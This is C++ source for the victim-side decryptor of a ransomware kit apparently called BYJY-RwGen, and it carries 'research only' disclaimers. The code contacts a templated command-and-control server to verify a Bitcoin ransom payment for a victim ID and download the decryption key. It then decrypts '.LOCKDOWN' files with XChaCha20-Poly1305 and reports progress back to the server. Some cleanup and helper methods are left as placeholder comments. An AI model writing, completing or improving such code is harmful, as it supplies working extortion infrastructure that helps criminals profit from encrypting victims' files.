/**
 * Enhanced Victim Decryptor with Advanced Error Handling
 * Improved reliability, retry mechanisms, and progress reporting
 * FOR RESEARCH ANALYSIS ONLY
 */

#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <thread>
#include <mutex>
#include <chrono>
#include <iomanip>
#include <sodium.h>
#include <curl/curl.h>
#include <json/json.h>

namespace fs = std::filesystem;

class AdvancedVictimDecryptor {
private:
    std::string master_key;
    std::string victim_id;
    std::string c2_domain;
    std::mutex progress_mutex;
    std::mutex log_mutex;
    int files_processed = 0;
    int total_files = 0;
    int retry_attempts = 0;
    const int max_retries = 3;
    
    // Performance tracking
    std::chrono::steady_clock::time_point start_time;
    std::vector<std::string> processing_errors;
    
    struct MemoryStruct {
        char *memory;
        size_t size;
    };
    
public:
    AdvancedVictimDecryptor() 
        : master_key("{{ENCRYPTION_KEY}}"), victim_id("{{VICTIM_ID}}"), c2_domain("{{C2_DOMAIN}}") {
        if (sodium_init() < 0) {
            throw std::runtime_error("Failed to initialize libsodium");
        }
        curl_global_init(CURL_GLOBAL_DEFAULT);
        start_time = std::chrono::steady_clock::now();
    }
    
    ~AdvancedVictimDecryptor() {
        curl_global_cleanup();
    }
    
    void logMessage(const std::string& message, const std::string& level = "INFO") {
        std::lock_guard<std::mutex> lock(log_mutex);
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        std::wcout << L"[" << std::put_time(std::localtime(&time_t), L"%Y-%m-%d %H:%M:%S") 
                  << L"] [" << std::wstring(level.begin(), level.end()) << L"] " 
                  << std::wstring(message.begin(), message.end()) << std::endl;
    }
    
    bool executeWithRetry(std::function<bool()> operation, const std::string& operation_name) {
        int attempts = 0;
        const int base_delay = 1000; // 1 second base delay
        
        while (attempts < max_retries) {
            try {
                if (operation()) {
                    if (attempts > 0) {
                        logMessage("Operation '" + operation_name + "' succeeded on attempt " + std::to_string(attempts + 1));
                    }
                    return true;
                }
            } catch (const std::exception& e) {
                logMessage("Operation '" + operation_name + "' failed: " + e.what(), "ERROR");
            }
            
            attempts++;
            if (attempts < max_retries) {
                int delay = base_delay * (1 << (attempts - 1)); // Exponential backoff
                logMessage("Retrying '" + operation_name + "' in " + std::to_string(delay/1000) + " seconds (attempt " + 
                          std::to_string(attempts + 1) + "/" + std::to_string(max_retries) + ")");
                std::this_thread::sleep_for(std::chrono::milliseconds(delay));
            }
        }
        
        logMessage("Operation '" + operation_name + "' failed after " + std::to_string(max_retries) + " attempts", "ERROR");
        return false;
    }
    
    void showAdvancedWelcomeMessage() {
        std::wcout << L"╔══════════════════════════════════════════════════════════════════╗\n";
        std::wcout << L"║                    ADVANCED FILE RECOVERY TOOL                   ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  Enhanced decryption system with improved reliability and       ║\n";
        std::wcout << L"║  comprehensive error handling for research purposes.            ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  FOR DEFENSIVE CYBERSECURITY RESEARCH ONLY                      ║\n";
        std::wcout << L"╚══════════════════════════════════════════════════════════════════╝\n\n";
        
        std::wcout << L"Victim ID: " << std::wstring(victim_id.begin(), victim_id.end()) << L"\n";
        std::wcout << L"C&C Server: " << std::wstring(c2_domain.begin(), c2_domain.end()) << L"\n";
        std::wcout << L"Recovery initiated at: " << getCurrentTimeString() << L"\n\n";
        
        logMessage("Advanced decryptor initialized for victim: " + victim_id);
    }
    
    bool verifyPaymentWithRetry() {
        logMessage("Starting payment verification with retry mechanism");
        
        return executeWithRetry([this]() -> bool {
            return this->performPaymentVerification();
        }, "payment_verification");
    }
    
    bool performPaymentVerification() {
        std::wcout << L"[1/6] Verifying payment status with C&C server...\n";
        
        std::string verification_url = "http://" + c2_domain + "/c2_server/api/verify_payment.php";
        std::string post_data = "victim_id=" + victim_id;
        
        std::string response = makeHttpRequest(verification_url, post_data);
        
        if (response.empty()) {
            throw std::runtime_error("Failed to contact verification server");
        }
        
        // Parse JSON response with error handling
        Json::Value json_response;
        Json::Reader reader;
        
        if (!reader.parse(response, json_response)) {
            throw std::runtime_error("Invalid JSON response from verification server");
        }
        
        bool payment_verified = json_response["payment_verified"].asBool();
        std::string status = json_response["status"].asString();
        
        if (payment_verified) {
            std::wcout << L"✓ Payment verified successfully\n";
            std::wcout << L"✓ Transaction ID: " << std::wstring(json_response["transaction_id"].asString().begin(), 
                                                               json_response["transaction_id"].asString().end()) << L"\n";
            std::wcout << L"✓ Amount: " << json_response["amount_received"].asDouble() << L" BTC\n\n";
            
            logMessage("Payment verification successful. Transaction: " + json_response["transaction_id"].asString());
            return true;
        } else {
            logMessage("Payment not verified: " + status, "WARNING");
            throw std::runtime_error("Payment not verified: " + status);
        }
    }
    
    bool downloadDecryptionKeyWithRetry() {
        logMessage("Starting decryption key download with retry mechanism");
        
        return executeWithRetry([this]() -> bool {
            return this->performKeyDownload();
        }, "key_download");
    }
    
    bool performKeyDownload() {
        std::wcout << L"[2/6] Downloading latest decryption key...\n";
        
        std::string key_url = "http://" + c2_domain + "/c2_server/api/get_decryption_key.php";
        std::string post_data = "victim_id=" + victim_id;
        
        std::string response = makeHttpRequest(key_url, post_data);
        
        if (response.empty()) {
            throw std::runtime_error("Failed to download decryption key");
        }
        
        Json::Value json_response;
        Json::Reader reader;
        
        if (!reader.parse(response, json_response)) {
            throw std::runtime_error("Invalid key response format");
        }
        
        if (json_response["success"].asBool()) {
            std::string downloaded_key = json_response["decryption_key"].asString();
            
            // Validate key format
            if (!validateKeyFormat(downloaded_key)) {
                throw std::runtime_error("Invalid decryption key format received");
            }
            
            master_key = downloaded_key;
            std::wcout << L"✓ Decryption key updated successfully\n";
            std::wcout << L"✓ Algorithm: " << std::wstring(json_response["algorithm"].asString().begin(),
                                                          json_response["algorithm"].asString().end()) << L"\n\n";
            
            logMessage("Decryption key downloaded and validated successfully");
            return true;
        } else {
            std::string error_msg = json_response["error"].asString();
            logMessage("Key download failed: " + error_msg, "ERROR");
            throw std::runtime_error("Failed to get decryption key: " + error_msg);
        }
    }
    
    bool validateKeyFormat(const std::string& key) {
        if (key.empty()) {
            return false;
        }
        
        // Check if it's valid hex
        for (char c : key) {
            if (!std::isxdigit(c)) {
                return false;
            }
        }
        
        // Check length (64 hex characters = 32 bytes)
        if (key.length() != 64) {
            logMessage("Key length validation failed: expected 64, got " + std::to_string(key.length()), "ERROR");
            return false;
        }
        
        return true;
    }
    
    std::vector<fs::path> findEncryptedFilesWithValidation() {
        std::wcout << L"[3/6] Scanning for encrypted files with validation...\n";
        
        std::vector<fs::path> encrypted_files;
        std::vector<std::string> search_paths = {
            "C:\\Users\\Public\\Documents",    // Safe test location
            "C:\\Users\\Public\\Desktop",      // Safe test location
            "D:\\TestData"                     // Safe test location
        };
        
        int dirs_scanned = 0;
        int dirs_accessible = 0;
        
        for (const auto& path : search_paths) {
            if (!fs::exists(path)) {
                logMessage("Search path does not exist: " + path, "WARNING");
                continue;
            }
            
            try {
                dirs_scanned++;
                
                for (const auto& entry : fs::recursive_directory_iterator(path)) {
                    if (entry.is_regular_file()) {
                        auto filepath = entry.path();
                        if (filepath.extension() == ".LOCKDOWN") {
                            // Validate file before adding to list
                            if (validateEncryptedFile(filepath)) {
                                encrypted_files.push_back(filepath);
                            } else {
                                logMessage("Skipping invalid encrypted file: " + filepath.string(), "WARNING");
                            }
                        }
                    }
                }
                dirs_accessible++;
                
            } catch (const std::exception& e) {
                logMessage("Error scanning directory " + path + ": " + e.what(), "WARNING");
                continue;
            }
        }
        
        total_files = encrypted_files.size();
        std::wcout << L"✓ Scanned " << dirs_scanned << L" directories (" << dirs_accessible << L" accessible)\n";
        std::wcout << L"✓ Found " << total_files << L" valid encrypted files\n\n";
        
        logMessage("File scan completed. Found " + std::to_string(total_files) + " encrypted files");
        
        return encrypted_files;
    }
    
    bool validateEncryptedFile(const fs::path& file_path) {
        try {
            // Check file size (should be at least nonce + tag size)
            auto file_size = fs::file_size(file_path);
            size_t min_size = crypto_aead_xchacha20poly1305_ietf_NPUBBYTES + crypto_aead_xchacha20poly1305_ietf_ABYTES;
            
            if (file_size < min_size) {
                return false;
            }
            
            // Check if file is readable
            std::ifstream file(file_path, std::ios::binary);
            if (!file.is_open()) {
                return false;
            }
            
            // Read a small portion to validate structure
            std::vector<char> header(min_size);
            file.read(header.data(), min_size);
            file.close();
            
            return file.gcount() == min_size;
            
        } catch (const std::exception& e) {
            return false;
        }
    }
    
    bool decryptAllFilesWithRecovery(const std::vector<fs::path>& files) {
        std::wcout << L"[4/6] Decrypting files with advanced error recovery...\n";
        
        if (files.empty()) {
            std::wcout << L"No encrypted files found to decrypt.\n";
            logMessage("No files to decrypt - operation completed");
            return true;
        }
        
        // Notify C&C server
        notifyDecryptionStarted(files.size());
        
        // Create progress display thread
        std::thread progress_thread(&AdvancedVictimDecryptor::showAdvancedProgress, this);
        
        // Multi-threaded decryption with error handling
        std::vector<std::thread> workers;
        const int num_threads = std::min(4, (int)std::thread::hardware_concurrency());
        const int files_per_thread = files.size() / num_threads + 1;
        
        std::vector<int> thread_success_count(num_threads, 0);
        std::vector<int> thread_failure_count(num_threads, 0);
        std::vector<std::vector<std::string>> thread_errors(num_threads);
        
        for (int i = 0; i < num_threads; ++i) {
            int start_idx = i * files_per_thread;
            int end_idx = std::min((int)files.size(), start_idx + files_per_thread);
            
            if (start_idx < end_idx) {
                auto file_range = std::vector<fs::path>(files.begin() + start_idx, files.begin() + end_idx);
                workers.emplace_back(&AdvancedVictimDecryptor::decryptFileRangeWithRecovery, this, 
                                   file_range, std::ref(thread_success_count[i]), std::ref(thread_failure_count[i]),
                                   std::ref(thread_errors[i]));
            }
        }
        
        // Wait for all threads
        for (auto& worker : workers) {
            worker.join();
        }
        
        // Stop progress thread
        progress_thread.detach();
        
        // Calculate totals
        int total_success = 0, total_failures = 0;
        for (int i = 0; i < num_threads; ++i) {
            total_success += thread_success_count[i];
            total_failures += thread_failure_count[i];
            
            // Collect errors
            for (const auto& error : thread_errors[i]) {
                processing_errors.push_back(error);
            }
        }
        
        std::wcout << L"\n✓ Decryption phase completed\n";
        std::wcout << L"  Files successfully decrypted: " << total_success << L"\n";
        std::wcout << L"  Files failed to decrypt: " << total_failures << L"\n";
        
        if (total_failures > 0) {
            std::wcout << L"  Error details logged for analysis\n";
        }
        
        // Notify C&C server of completion
        notifyDecryptionCompleted(total_success, total_failures);
        
        // Generate error report if needed
        if (!processing_errors.empty()) {
            generateErrorReport();
        }
        
        logMessage("Decryption completed. Success: " + std::to_string(total_success) + 
                  ", Failures: " + std::to_string(total_failures));
        
        return total_success > 0;
    }
    
    void decryptFileRangeWithRecovery(const std::vector<fs::path>& files, int& success_count, 
                                    int& failure_count, std::vector<std::string>& errors) {
        for (const auto& encrypted_file : files) {
            try {
                if (decryptSingleFileWithRetry(encrypted_file)) {
                    success_count++;
                } else {
                    failure_count++;
                    errors.push_back("Decryption failed: " + encrypted_file.string());
                }
                
                // Update progress
                {
                    std::lock_guard<std::mutex> lock(progress_mutex);
                    files_processed++;
                }
                
            } catch (const std::exception& e) {
                failure_count++;
                errors.push_back("Exception in " + encrypted_file.string() + ": " + e.what());
            }
        }
    }
    
    bool decryptSingleFileWithRetry(const fs::path& encrypted_file) {
        return executeWithRetry([this, &encrypted_file]() -> bool {
            return this->performFileDecryption(encrypted_file);
        }, "decrypt_" + encrypted_file.filename().string());
    }
    
    bool performFileDecryption(const fs::path& encrypted_file) {
        // Create backup of encrypted file before attempting decryption
        fs::path backup_file = encrypted_file;
        backup_file += ".backup";
        
        try {
            fs::copy_file(encrypted_file, backup_file);
        } catch (const std::exception& e) {
            logMessage("Failed to create backup for " + encrypted_file.string() + ": " + e.what(), "WARNING");
        }
        
        try {
            // Read encrypted file
            std::ifstream file(encrypted_file, std::ios::binary);
            if (!file) {
                throw std::runtime_error("Cannot open encrypted file: " + encrypted_file.string());
            }
            
            std::vector<unsigned char> encrypted_data(
                (std::istreambuf_iterator<char>(file)),
                std::istreambuf_iterator<char>()
            );
            file.close();
            
            if (encrypted_data.empty()) {
                throw std::runtime_error("Empty encrypted file: " + encrypted_file.string());
            }
            
            // Decrypt file content
            auto decrypted_data = performDecryptionWithValidation(encrypted_data);
            
            // Determine original filename
            fs::path original_file = encrypted_file;
            original_file.replace_extension("");
            
            // Write decrypted file atomically
            fs::path temp_file = original_file;
            temp_file += ".tmp";
            
            {
                std::ofstream output_file(temp_file, std::ios::binary);
                if (!output_file) {
                    throw std::runtime_error("Cannot create temporary file: " + temp_file.string());
                }
                
                output_file.write(
                    reinterpret_cast<const char*>(decrypted_data.data()),
                    decrypted_data.size()
                );
                output_file.close();
                
                if (output_file.fail()) {
                    throw std::runtime_error("Failed to write decrypted data");
                }
            }
            
            // Verify decrypted file size
            if (fs::file_size(temp_file) != decrypted_data.size()) {
                fs::remove(temp_file);
                throw std::runtime_error("File size mismatch after decryption");
            }
            
            // Atomic rename
            fs::rename(temp_file, original_file);
            
            // Remove encrypted file and backup
            fs::remove(encrypted_file);
            if (fs::exists(backup_file)) {
                fs::remove(backup_file);
            }
            
            return true;
            
        } catch (const std::exception& e) {
            // Restore from backup if decryption failed
            if (fs::exists(backup_file)) {
                try {
                    if (!fs::exists(encrypted_file)) {
                        fs::rename(backup_file, encrypted_file);
                    } else {
                        fs::remove(backup_file);
                    }
                } catch (...) {
                    // Ignore backup restoration errors
                }
            }
            
            throw; // Re-throw original exception
        }
    }
    
    std::vector<unsigned char> performDecryptionWithValidation(const std::vector<unsigned char>& ciphertext) {
        size_t min_size = crypto_aead_xchacha20poly1305_ietf_NPUBBYTES + crypto_aead_xchacha20poly1305_ietf_ABYTES;
        
        if (ciphertext.size() < min_size) {
            throw std::runtime_error("Ciphertext too short for XChaCha20-Poly1305");
        }
        
        // Extract nonce (last 24 bytes)
        size_t nonce_size = crypto_aead_xchacha20poly1305_ietf_NPUBBYTES;
        size_t ciphertext_len = ciphertext.size() - nonce_size;
        const unsigned char* nonce = ciphertext.data() + ciphertext_len;
        
        // Convert hex key to bytes
        std::vector<unsigned char> key_bytes;
        if (master_key.length() != 64) {
            throw std::runtime_error("Invalid key length: expected 64 hex characters");
        }
        
        for (size_t i = 0; i < master_key.length(); i += 2) {
            std::string byte_str = master_key.substr(i, 2);
            try {
                key_bytes.push_back((unsigned char)strtol(byte_str.c_str(), nullptr, 16));
            } catch (...) {
                throw std::runtime_error("Invalid hex character in key");
            }
        }
        
        if (key_bytes.size() != crypto_aead_xchacha20poly1305_ietf_KEYBYTES) {
            throw std::runtime_error("Key size mismatch");
        }
        
        // Decrypt
        std::vector<unsigned char> plaintext(ciphertext_len);
        unsigned long long plaintext_len;
        
        int result = crypto_aead_xchacha20poly1305_ietf_decrypt(
            plaintext.data(), &plaintext_len,
            nullptr,
            ciphertext.data(), ciphertext_len,
            nullptr, 0,
            nonce,
            key_bytes.data()
        );
        
        if (result != 0) {
            throw std::runtime_error("Decryption failed - authentication tag verification failed");
        }
        
        plaintext.resize(plaintext_len);
        return plaintext;
    }
    
    void generateErrorReport() {
        std::wcout << L"[5/6] Generating error analysis report...\n";
        
        try {
            std::string report_filename = "decryption_errors_" + victim_id + "_" + 
                                        std::to_string(std::chrono::duration_cast<std::chrono::seconds>(
                                        std::chrono::system_clock::now().time_since_epoch()).count()) + ".txt";
            
            std::ofstream report(report_filename);
            if (report.is_open()) {
                report << "BYJY-RwGen Decryption Error Report\n";
                report << "Generated: " << getCurrentTimeString() << "\n";
                report << "Victim ID: " << victim_id << "\n";
                report << "Total Errors: " << processing_errors.size() << "\n";
                report << "==========================================\n\n";
                
                for (size_t i = 0; i < processing_errors.size(); ++i) {
                    report << "Error " << (i + 1) << ": " << processing_errors[i] << "\n";
                }
                
                report.close();
                
                std::wcout << L"✓ Error report saved: " << std::wstring(report_filename.begin(), report_filename.end()) << L"\n";
                logMessage("Error report generated: " + report_filename);
            }
        } catch (const std::exception& e) {
            logMessage("Failed to generate error report: " + std::string(e.what()), "ERROR");
        }
    }
    
    void performAdvancedSystemCleanup() {
        std::wcout << L"[6/6] Performing advanced system cleanup...\n";
        
        // ... (rest of cleanup implementation similar to original but with better error handling)
        
        logMessage("Advanced system cleanup completed");
    }
    
    void showAdvancedProgress() {
        auto start_time = std::chrono::steady_clock::now();
        
        while (files_processed < total_files) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            
            {
                std::lock_guard<std::mutex> lock(progress_mutex);
                if (total_files > 0) {
                    int percentage = (files_processed * 100) / total_files;
                    auto now = std::chrono::steady_clock::now();
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
                    
                    std::wcout << L"\rProgress: [";
                    
                    int bar_width = 50;
                    int filled = (percentage * bar_width) / 100;
                    
                    for (int i = 0; i < bar_width; ++i) {
                        if (i < filled) std::wcout << L"█";
                        else std::wcout << L"░";
                    }
                    
                    std::wcout << L"] " << percentage << L"% (" 
                              << files_processed << L"/" << total_files << L") ";
                    
                    if (files_processed > 0 && elapsed > 0) {
                        float rate = (float)files_processed / (float)elapsed;
                        int eta_seconds = (int)((total_files - files_processed) / rate);
                        std::wcout << L"Rate: " << std::fixed << std::setprecision(1) << rate << L" files/s ";
                        std::wcout << L"ETA: " << eta_seconds/60 << L":" << std::setfill(L'0') << std::setw(2) << eta_seconds%60;
                    }
                }
            }
        }
    }
    
    // ... (other helper methods similar to original template)
    
    std::wstring getCurrentTimeString() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        wchar_t time_str[100];
        struct tm timeinfo;
        localtime_s(&timeinfo, &time_t);
        wcsftime(time_str, sizeof(time_str), L"%Y-%m-%d %H:%M:%S", &timeinfo);
        
        return std::wstring(time_str);
    }
    
    // ... (implement remaining methods from original template with enhancements)
};

int main(int argc, char* argv[]) {
    try {
        SetConsoleOutputCP(CP_UTF8);
        std::wcout.imbue(std::locale(""));
        
        AdvancedVictimDecryptor decryptor;
        
        decryptor.showAdvancedWelcomeMessage();
        
        if (!decryptor.verifyPaymentWithRetry()) {
            std::wcout << L"Payment verification failed after multiple attempts.\n";
            return 1;
        }
        
        if (!decryptor.downloadDecryptionKeyWithRetry()) {
            std::wcout << L"Failed to retrieve decryption key after multiple attempts.\n";
            return 1;
        }
        
        auto encrypted_files = decryptor.findEncryptedFilesWithValidation();
        
        if (!decryptor.decryptAllFilesWithRecovery(encrypted_files)) {
            std::wcout << L"Decryption process encountered critical errors.\n";
            return 1;
        }
        
        decryptor.performAdvancedSystemCleanup();
        
        std::wcout << L"✓ Advanced file recovery completed successfully!\n";
        
        return 0;
        
    } catch (const std::exception& e) {
        std::wcout << L"Critical error: " << e.what() << L"\n";
        return 1;
    }
}